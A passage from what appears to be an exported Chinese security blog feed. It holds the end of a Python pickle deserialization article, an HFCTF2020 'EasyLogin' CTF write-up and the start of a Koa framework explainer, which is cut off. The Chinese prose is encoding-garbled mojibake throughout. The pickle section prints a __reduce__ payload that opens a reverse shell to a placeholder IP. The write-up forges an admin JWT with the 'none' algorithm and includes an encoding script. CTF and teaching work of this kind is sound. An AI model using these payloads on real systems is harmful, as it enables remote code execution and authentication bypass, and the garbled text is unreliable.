ä¸­å‡ºç°çš„ç±»(åŒ…æ‹¬é€šè¿‡ importçš„æ–¹å¼å¼•å…¥çš„æ¨¡å—ä¸­çš„ç±»)çš„å¯¹è±¡ä»¥å¤–ï¼Œè¿˜èƒ½åˆ©ç”¨å…¶å½»åº•çš„é¢å‘å¯¹è±¡çš„ç‰¹æ€§æ¥ååºåˆ—åŒ–ä½¿ç”¨  types åˆ›å»ºçš„åŒ¿åå¯¹è±¡ï¼ˆè¿™éƒ¨åˆ†å†…å®¹åœ¨åé¢ä¼šæœ‰æ‰€ä»‹ç»ï¼‰ï¼Œå¤§å¤§æ‹“å®½äº†æˆ‘ä»¬çš„æ”»å‡»é¢ã€‚</p><h2 id="Pickle-CPickle-ååºåˆ—åŒ–æ¼æ´åˆ†æ"><a class="header-anchor" href="#Pickle-CPickle-ååºåˆ—åŒ–æ¼æ´åˆ†æ">ğŸ­</a>Pickle/CPickle ååºåˆ—åŒ–æ¼æ´åˆ†æ</h2><p>æ¯å½“ååºåˆ—åŒ–è¿‡ç¨‹å¼€å§‹æˆ–è€…ç»“æŸæ—¶ , éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨ä¸€ç±»å‡½æ•° ã€‚å¦‚PHP çš„ <strong><code>__wakeup()</code></strong> é­”æœ¯æ–¹æ³• ,pythonä¸­åˆ™æ˜¯ <strong><code>__reduce__()</code></strong>  é­”æœ¯æ–¹æ³•ã€‚</p><h3 id="reduce"><a class="header-anchor" href="#reduce">ğŸ­</a><code>__reduce__()</code></h3><p>å®˜æ–¹æ–‡æ¡£è§£é‡Šï¼š</p><p><img src="/2021/07/23/pickle/4.png" alt="4"></p><p><strong>å½“åºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ç¢°åˆ°ä¸€æ— æ‰€çŸ¥çš„æ‰©å±•ç±»å‹( æ¯”å¦‚ä½¿ç”¨ C è¯­è¨€å®ç°çš„ Python æ‰©å±•ç±» )æ—¶ï¼Œå¯ä»¥é€šè¿‡ç±»ä¸­å®šä¹‰çš„ <code>__reduce__()</code> æ–¹æ³•æ¥å‘ŠçŸ¥ Python å¦‚ä½•è¿›è¡Œåºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–æ“ä½œ</strong>ã€‚å½“ <strong><code>__reduce__()</code></strong> å‡½æ•°è¿”å›ä¸€ä¸ªå…ƒç»„æ—¶ , ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ , è¿™ä¸ªå¯¹è±¡ä¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶è¢«è°ƒç”¨ . ç¬¬äºŒä¸ªå…ƒç´ æ˜¯å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•° , åŒæ ·æ˜¯ä¸€ä¸ªå…ƒç»„ç¬¦åˆ PVM æ“ä½œç ä¸­ <strong><code>R</code></strong> æ“ä½œç å®ç°çš„åŠŸèƒ½ã€‚åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ç»“æŸçš„æ—¶å€™ , Python è¿›ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨ <strong><code>__reduce__()</code></strong> é­”æœ¯æ–¹æ³• . å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•° , Python è¿›ç¨‹å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼ˆå’ŒPHPååºåˆ—åŒ–æ¼æ´ä¸€æ ·ï¼‰ã€‚</p><p>å®ä¾‹ï¼š</p><p><img src="/2021/07/23/pickle/5.png" alt="5"></p><p>ï¼ˆæ‘˜è‡ª<strong>Epicccal</strong>å¸ˆå‚…å®ä¾‹ï¼‰</p><p>RCEåå¯bashå‘½ä»¤åå¼¹shellæˆ–python -c æ‰§è¡Œä»»æ„ Python ä»£ç :</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<span class="hljs-keyword">import</span> os<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>(<span class="hljs-params">object</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span>        a = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span>        <span class="hljs-keyword">return</span> (os.system,(a,))    a=A()result = pickle.dumps(a)pickle.loads(result)</code></pre><h2 id="ååºåˆ—åŒ–æ¼æ´å‡ºç°çš„åœ°æ–¹"><a class="header-anchor" href="#ååºåˆ—åŒ–æ¼æ´å‡ºç°çš„åœ°æ–¹">ğŸ­</a>ååºåˆ—åŒ–æ¼æ´å‡ºç°çš„åœ°æ–¹</h2><ul><li><p><strong>é€šå¸¸åœ¨è§£æè®¤è¯tokenï¼Œsessionçš„æ—¶å€™</strong></p><p>å…¸å‹æ¡ˆä¾‹å°±æ˜¯ flask é…åˆ redis åœ¨æœåŠ¡ç«¯å­˜å‚¨ session çš„æƒ…æ™¯ï¼Œ session æ˜¯è¢« pickle  åºåˆ—åŒ–è¿›è¡Œå­˜å‚¨çš„ï¼Œå¦‚æœä½ é€šè¿‡ cookie è¿›è¡Œè¯·æ±‚ sessionid çš„è¯ï¼Œsession  ä¸­çš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œç»“åˆä¸Šä¹‹å‰è®²è¿‡çš„ redis  çš„æœªæˆæƒè®¿é—®ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡ set è®¾ç½®è‡ªå·±çš„ session ,ç„¶åé€šè¿‡è®¾ç½® cookie å»è¯·æ±‚ session  çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬è‡ªå®šçš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œç„¶åæˆ‘ä»¬å°±è¾¾åˆ°äº†æ‰§è¡Œä»»æ„å‘½ä»¤æˆ–è€…ä»»æ„ä»£ç çš„ç›®çš„</p></li><li><p>å¯èƒ½å°†å¯¹è±¡Pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶ã€‚</p></li><li><p>å¯èƒ½å°†å¯¹è±¡Pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“ã€‚</p></li></ul><h2 id="ååºåˆ—åŒ–æ¼æ´é˜²å¾¡"><a class="header-anchor" href="#ååºåˆ—åŒ–æ¼æ´é˜²å¾¡">ğŸ­</a>ååºåˆ—åŒ–æ¼æ´é˜²å¾¡</h2><ul><li>ä¸åœ¨ä¸å®ˆä¿¡ä»»çš„é€šé“ä¸­ä¼ é€’ pcikle åºåˆ—åŒ–å¯¹è±¡</li><li>åœ¨ä¼ é€’åºåˆ—åŒ–å¯¹è±¡å‰è¯·è¿›è¡Œç­¾åæˆ–è€…åŠ å¯†ï¼Œé˜²æ­¢ç¯¡æ”¹å’Œé‡æ’­</li><li>å¦‚æœåºåˆ—åŒ–æ•°æ®å­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼Œè¯·ç¡®ä¿ä¸å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ä¸èƒ½ä¿®æ”¹ã€è¦†ç›–æˆ–è€…é‡æ–°åˆ›å»ºè‡ªå·±çš„åºåˆ—åŒ–æ•°æ®</li><li>å°† pickle åŠ è½½çš„æ•°æ®åˆ—å…¥ç™½åå•</li></ul><p>å‚è€ƒï¼š</p><p><a href="https://www.guildhab.top/2019/12/python-pickle-cpickle-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/">https://www.guildhab.top/2019/12/python-pickle-cpickle-ååºåˆ—åŒ–æ¼æ´/</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹Python ååºåˆ—åŒ–æ¼æ´/</a></p>]]></content>
    
    
    <categories>
      
      <category>ååºåˆ—åŒ–æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HFCTF2020||EasyLogin</title>
    <link href="/2021/07/20/jwt/"/>
    <url>/2021/07/20/jwt/</url>
    
    <content type="html"><![CDATA[<p>æ¶‰åŠçŸ¥è¯†ç‚¹</p><ul><li>koaæ¡†æ¶(node.js)</li><li>jwtä»¤ç‰Œ</li></ul><p>ä¸Šä¸€ç¯‡æ–‡ç« äº†è§£äº†koaæ¡†æ¶å’Œjwt,ç›´æ¥åšé¢˜ï¼š</p><p>è®¿é—®é¡µé¢æŸ¥çœ‹æºç å‘ç°ä¸€ä¸ªjsæ–‡ä»¶</p><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> *  æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶</span><span class="hljs-comment"> *  è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD</span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();    <span class="hljs-keyword">const</span> token = sessionStorage.getItem(<span class="hljs-string">&quot;token&quot;</span>);    $.post(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123;username, password, <span class="hljs-attr">authorization</span>:token&#125;)        .done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;            <span class="hljs-keyword">const</span> &#123;status&#125; = data;            <span class="hljs-keyword">if</span>(status) &#123;                <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&quot;/home&quot;</span>;            &#125;        &#125;)        .fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;            alert(xhr.responseJSON.message);        &#125;);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).val();    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).val();    $.post(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;username, password&#125;)        .done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;            <span class="hljs-keyword">const</span> &#123; token &#125; = data;            sessionStorage.setItem(<span class="hljs-string">&#x27;token&#x27;</span>, token);            <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&quot;/login&quot;</span>;        &#125;)        .fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;            alert(xhr.responseJSON.message);        &#125;);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>) </span>&#123;    $.get(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;        <span class="hljs-keyword">const</span> &#123;status&#125; = data;        <span class="hljs-keyword">if</span>(status) &#123;            <span class="hljs-built_in">document</span>.location = <span class="hljs-string">&#x27;/login&#x27;</span>;        &#125;    &#125;);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;    $.get(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).done(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;        <span class="hljs-keyword">const</span> &#123;flag&#125; = data;        $(<span class="hljs-string">&quot;#username&quot;</span>).val(flag);    &#125;).fail(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) </span>&#123;        alert(xhr.responseJSON.message);    &#125;);&#125;</code></pre><p>ç”±æ³¨é‡Šå¯çŸ¥ä½¿ç”¨äº†koaæ¡†æ¶,å…³é”®ä»£ç æ”¾ç½®åœ¨<code>controllers</code>ä¸‹çš„apié‡Œ</p><p>api.jsï¼š</p><pre><code class="hljs livescript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<span class="hljs-keyword">const</span> APIError = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<span class="hljs-built_in">module</span>.<span class="hljs-built_in">exports</span> = &#123;    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);        &#125;        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;            <span class="hljs-built_in">global</span>.secrets = [];        &#125;        <span class="hljs-keyword">const</span> secret = crypto.randomBytes(<span class="hljs-number">18</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);        <span class="hljs-keyword">const</span> secretid = <span class="hljs-built_in">global</span>.secrets.length;        <span class="hljs-built_in">global</span>.secrets.push(secret)        <span class="hljs-keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);        ctx.rest(&#123;            token: token        &#125;);        <span class="hljs-keyword">await</span> next();    &#125;,    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;        <span class="hljs-keyword">if</span>(!username || !password) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);        &#125;        <span class="hljs-keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        <span class="hljs-keyword">const</span> sid = <span class="hljs-built_in">JSON</span>.parse(Buffer.<span class="hljs-keyword">from</span>(token.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).toString()).secretid;        <span class="hljs-built_in">console</span>.log(sid)        <span class="hljs-keyword">if</span>(sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);        &#125;        <span class="hljs-keyword">const</span> secret = <span class="hljs-built_in">global</span>.secrets[sid];        <span class="hljs-keyword">const</span> user = jwt.verify(token, secret, &#123;algorithm: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);        <span class="hljs-keyword">const</span> status = username === user.username &amp;&amp; password === user.password;        <span class="hljs-keyword">if</span>(status) &#123;            ctx.session.username = username;        &#125;        ctx.rest(&#123;            status        &#125;);        <span class="hljs-keyword">await</span> next();    &#125;,    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> APIError(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);        &#125;        <span class="hljs-keyword">const</span> flag = fs.readFileSync(<span class="hljs-string">&#x27;/flag&#x27;</span>).toString();        ctx.rest(&#123;            flag        &#125;);        <span class="hljs-keyword">await</span> next();    &#125;,    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-keyword">async</span> (ctx, next) =&gt; &#123;        ctx.session.username = <span class="hljs-literal">null</span>;        ctx.rest(&#123;            status: <span class="hljs-literal">true</span>        &#125;)        <span class="hljs-keyword">await</span> next();    &#125;&#125;;</code></pre><p>å…¶ä¸­</p><pre><code class="hljs reasonml">&#x27;GET /api/flag&#x27;: async<span class="hljs-function"> (<span class="hljs-params">ctx</span>, <span class="hljs-params">next</span>) =&gt;</span> &#123;       <span class="hljs-keyword">if</span>(ctx.session.username !== &#x27;admin&#x27;)&#123;           throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">APIError(&#x27;<span class="hljs-params">permission</span> <span class="hljs-params">error</span>&#x27;, &#x27;<span class="hljs-params">permission</span> <span class="hljs-params">denied</span>&#x27;)</span>;       &#125;       const flag = fs.read<span class="hljs-constructor">FileSync(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">flag</span>&#x27;)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;       ctx.rest(&#123;           flag       &#125;);       await next<span class="hljs-literal">()</span>;   &#125;,</code></pre><p>å¯çŸ¥<code>admin</code>æ‰èƒ½æ‹¿åˆ°flag, ä½†æ³¨å†Œçš„æ—¶å€™ï¼Œç”¨æˆ·åä¸èƒ½ä¸ºadminï¼Œä¼šç”Ÿæˆjwtä»¤ç‰Œ, ç™»å½•çš„æ—¶å€™ï¼Œæ ¡éªŒç›¸åº”çš„jwtä»¤ç‰Œ</p><p>ç™»å½•æ—¶è¿›è¡ŒæŠ“åŒ…</p><p><img src="/2021/07/20/jwt/1.jpg" alt="1"></p><p>å“åº”æ¶ˆæ¯ä¸­ï¼Œæœ‰ä¸¤ä¸ªå€¼ ,è®¿é—®flagæ—¶ä¼šç”¨è¿™ä¸¤ä¸ªå€¼å»éªŒè¯</p><p><img src="/2021/07/20/jwt/2.jpg" alt="2"></p><p>ä¸æ˜¯adminç”¨æˆ·,æŠ¥é”™, æ­¤æ—¶å¯ç”¨<code>jwtä¼ªé€ </code>ä¼ªè£…æˆ<code>admin</code>æ‹¿flag;æºç ä¸­è§„å®šäº†jwtå†…å®¹:</p><pre><code class="hljs pgsql">const token = jwt.sign(&#123;secretid, username, <span class="hljs-keyword">password</span>&#125;, secret, &#123;algorithm: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);</code></pre><p>å¦‚ä¸Š,æˆ‘ä»¬å¯ä»¥åœ¨https://jwt.io/è§£æjwt</p><p><img src="/2021/07/20/jwt/3.jpg" alt="3"></p><p>ç›´æ¥è¿ç”¨ å°†åŠ å¯†æ–¹å¼æ”¹ä¸ºnoneçš„æ–¹å¼ï¼Œpayload:</p><pre><code class="hljs prolog">&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;none&quot;</span>,<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;JWT&quot;</span>&#125;.&#123;  <span class="hljs-string">&quot;secretid&quot;</span>:[],  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>,  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1587632063</span>  &#125;</code></pre><p>ç¼–ç ååœ¨ç™»å½•æ—¶æŠ“åŒ…æ›¿æ¢authorizationå€¼</p><p><img src="/2021/07/20/jwt/4.jpg" alt="4"></p><p>è®¿é—®flagæ—¶å†æ›¿æ¢ä¸Šè¿°ä¸¤ä¸ªå€¼<code>sses.aok</code>,<code>sses.sok.sig</code></p><p><img src="/2021/07/20/jwt/5.jpg" alt="5"></p><p>ç¼–ç å¯åœ¨ç½‘ç«™ä¹Ÿå¯ç”¨è„šæœ¬</p><p>ç¼–ç è„šæœ¬:</p><pre><code class="hljs routeros">import jwtpayload = &#123;    <span class="hljs-string">&quot;secretid&quot;</span>: 0.1,    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>,    <span class="hljs-string">&quot;iat&quot;</span>: 1587287370&#125;myToken = jwt.encode(payload, <span class="hljs-attribute">algorithm</span>=<span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-attribute">key</span>=<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-builtin-name">print</span>(myToken)</code></pre><p>å‚è€ƒ:</p><p><a href="https://blog.csdn.net/K1ose/article/details/115189727">[HFCTF2020]EasyLogin</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>koaæ¡†æ¶æµ…æ</title>
    <link href="/2021/07/19/koa/"/>
    <url>/2021/07/19/koa/</url>
    
    <content type="html"><![CDATA[<h2 id="koaæ¡†æ¶"><a class="header-anchor" href="#koaæ¡†æ¶">ğŸ­</a>koaæ¡†æ¶</h2><p>Koa æ˜¯ä¸€ä¸ªæ–°çš„ web æ¡†æ¶ï¼Œ é€šè¿‡åˆ©ç”¨ async å‡½æ•°ï¼ŒKoa ä¸¢å¼ƒäº†å›è°ƒå‡½æ•°ï¼Œå¢å¼ºé”™è¯¯å¤„ç†ï¼Œæ²¡æœ‰æ†ç»‘ä»»ä½•ä¸­é—´ä»¶ã€‚</p><h3 id="ç›®å½•ç»“æ„"><a class="header-anchor" href="#ç›®å½•ç»“æ„">ğŸ­</a>ç›®å½•ç»“æ„</h3><img src="/2021/07/19/koa/1.png" alt="1" style="zoom:50%;"><h4 id="app-js"><a class="header-anchor" href="#app-js">ğŸ­</a>app.js</h4><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span><span class="hljs-keyword">const</span> Koa = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>)<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-bodyparser&#x27;</span>)()<span class="hljs-keyword">const</span> staticCache = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-static-cache&#x27;</span>)<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./config&#x27;</span>)<span class="hljs-keyword">const</span> publicRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/public&#x27;</span>)<span class="hljs-keyword">const</span> privateRouter = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./routes/private&#x27;</span>)<span class="hljs-keyword">const</span> &#123; loggerMiddleware &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./middlewares/logger&#x27;</span>)<span class="hljs-keyword">const</span> &#123; errorHandler, responseHandler &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./middlewares/response&#x27;</span>)<span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> Koa()<span class="hljs-comment">// Logger</span>app.use(loggerMiddleware)<span class="hljs-comment">// Error Handler</span>app.use(errorHandler)<span class="hljs-comment">// Global Middlewares</span>app.use(bodyParser)app.use(staticCache(config.publicDir))<span class="hljs-comment">// Routes</span>app.use(publicRouter.routes(), publicRouter.allowedMethods())app.use(privateRouter.routes(), privateRouter.allowedMethods())<span class="hljs-comment">// Response</span>app.use(responseHandler)<span class="hljs-built_in">module</span>.exports = app</code></pre><p>æ–‡ä»¶æœ‰è¾ƒå¤šçš„ä¸­é—´ä»¶ï¼Œä¸­é—´ä»¶çš„æ‰§è¡Œé¡ºåºæ˜¯ä»å¤–åˆ°å†…ï¼Œå†ä»å†…åˆ°å¤–ï¼Œä¹Ÿå°±æ˜¯æ´‹è‘±æ¨¡å¼ã€‚ä¸­é—´ä»¶çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯ä¾é <code>app.use()</code>è¿›è¡Œä¼ é€’çš„ï¼Œå¯ä»¥ç®€å•çš„ç†è§£ä¸ºè‡ªå·±ç¼–å†™çš„å‡½æ•°ï¼Œä¾æ¬¡å»æ‰§è¡Œå³å¯ã€‚æ¯ä¸€ä¸ªä¸­é—´ä»¶ä¼šåœ¨appè°ƒç”¨æ˜¯ä¼ å…¥2ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸ºï¼š <code>ctx</code>å’Œ<code>next</code></p><blockquote><p>ctx:<br>Koa Context å°† node çš„ request å’Œ response å¯¹è±¡å°è£…åœ¨ä¸€ä¸ªå•ç‹¬çš„å¯¹è±¡é‡Œé¢ï¼Œå…¶ä¸ºç¼–å†™ web åº”ç”¨å’Œ API æä¾›äº†å¾ˆå¤šæœ‰ç”¨çš„æ–¹æ³•ã€‚<br>è¿™äº›æ“ä½œåœ¨HTTPæœåŠ¡å™¨å¼€å‘ä¸­ç»å¸¸ä½¿ç”¨ï¼Œå› æ­¤å…¶è¢«æ·»åŠ åœ¨ä¸Šä¸‹æ–‡è¿™ä¸€å±‚ï¼Œè€Œä¸æ˜¯æ›´é«˜å±‚æ¡†æ¶ä¸­ï¼Œå› æ­¤å°†è¿«ä½¿ä¸­é—´ä»¶éœ€è¦é‡æ–°å®ç°è¿™äº›å¸¸ç”¨æ–¹æ³•ã€‚</p><p>nextï¼š<br>ä¸‹ä¸€ä¸ªä¸­é—´ä»¶å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸€ä¸ªä¸­é—´ä»¶å¦‚æœè¦å¾€ä¸‹èµ°å¿…é¡»å†™ä¸Šè¿™ä¸ªï¼Œå¦åˆ™æ— æ³•æ‰§è¡Œã€‚<br>å¯ä»¥ç†è§£ä¸ºå‰ç«¯çš„vue-Routerä¸­çš„è·¯ç”±å®ˆå«ä¸­çš„next(), æ‰§è¡Œä¸‹ä¸€æ­¥æˆ–è€…è¿›è¡Œä¼ å‚ã€‚</p></blockquote><h4 id="middlewaresæ–‡ä»¶"><a class="header-anchor" href="#middlewaresæ–‡ä»¶">ğŸ­</a>middlewaresæ–‡ä»¶</h4><p>åœ¨è¿™ä¸ªé¡¹ç›®ä¸»è¦ç”¨åˆ°äº†å‡ ä¸ªä¸­é—´ä»¶:<code>logger.js</code>,<code>response.js</code>, <code>jwt.js</code>ç­‰å…¶ä»–ä¸­é—´ä»¶ã€‚è‹¥åœ¨æ­¤ç›®å½•ä¸­æ–°å»ºå¯¹åº”ä¸­é—´ä»¶åï¼Œè¦åœ¨app.jsä¸­è¿›è¡Œå¼•å…¥ï¼Œå¦åœ¨æ— æ³•ç”Ÿæ•ˆã€‚ä¸­é—´ä»¶çš„æ‰§è¡Œå¾ˆåƒä¸€ä¸ªæ´‹è‘±ï¼Œä½†å¹¶ä¸æ˜¯ä¸€å±‚ä¸€å±‚çš„æ‰§è¡Œï¼Œè€Œæ˜¯ä»¥nextä¸ºåˆ†ç•Œï¼Œå…ˆæ‰§è¡Œæœ¬å±‚ä¸­nextä»¥å‰çš„éƒ¨åˆ†ï¼Œå½“ä¸‹ä¸€å±‚ä¸­é—´ä»¶æ‰§è¡Œå®Œåï¼Œå†æ‰§è¡Œæœ¬å±‚nextä»¥åçš„éƒ¨åˆ†ã€‚</p><p><img src="/2021/07/19/koa/2.png" alt="2"></p><h5 id="logger-js"><a class="header-anchor" href="#logger-js">ğŸ­</a>logger.js</h5><p>è¿™ä¸ªä¸­é—´ä»¶ä¼šåœ¨æ§åˆ¶å°æˆ–è€…æ—¥å¿—ä¸­æ‰“å°å‡ºå›ºå®šçš„æ 